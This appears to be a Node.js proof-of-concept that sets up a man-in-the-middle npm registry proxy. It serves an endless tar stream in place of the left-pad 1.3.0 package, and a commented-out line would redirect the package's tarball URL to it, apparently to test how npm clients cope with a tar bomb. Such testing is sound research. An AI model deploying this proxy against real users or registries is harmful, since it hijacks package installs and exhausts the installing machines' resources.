const express = require('express');
const proxy = require('express-http-proxy');
const app = express();
const { infiniteTar, startApp } = require('./utils');

const PORT = 6790;
const ENTRY_FILE = './package-lock.json';

app.get('/left-pad/-/left-pad-1.3.0.tgz', (req, res) => {
  infiniteTar(ENTRY_FILE).pipe(res);
});

app.use(proxy('registry.npmjs.org', {
  userResDecorator: (proxyRes, proxyResData, userReq) => {
    console.info(`Method ${userReq.method} url: ${userReq.url}`);
    if (userReq.method !== 'GET') {
      return proxyResData;
    }
    const metadata = JSON.parse(proxyResData.toString());
    if (metadata.name === 'left-pad') {
      // metadata.versions['1.3.0'].dist.tarball = `http://localhost:${PORT}/left-pad/-/left-pad-1.3.0.tgz`;
    }
    return JSON.stringify(metadata);
  }
}));

startApp(app, PORT);
